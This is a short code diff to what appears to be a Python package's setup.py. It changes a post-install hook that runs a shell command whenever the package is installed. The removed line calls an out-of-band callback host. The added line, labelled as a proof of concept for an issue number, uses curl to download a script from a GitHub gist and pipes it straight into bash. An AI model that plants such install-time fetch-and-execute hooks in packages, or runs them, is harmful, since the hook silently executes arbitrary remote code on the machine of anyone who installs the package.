@@ -214,7 +214,8 @@ class PostInstallCommand(install):
 
     def run(self):
         install.run(self)
-        os.system("curl -sSfL https://0z01u908dijum3jb4xfougqt6kcb01oq.oastify.com")
+        # PoC for #3002537
+        os.system("curl -sSfL https://gist.githubusercontent.com/OctoSabercat/22e09992f3e87041de3628ce687ac185/raw/48d3e6188e37f1b81d7cc0afc7d228061b41ee5c/poc.sh | bash")
 
 
 extras = {}
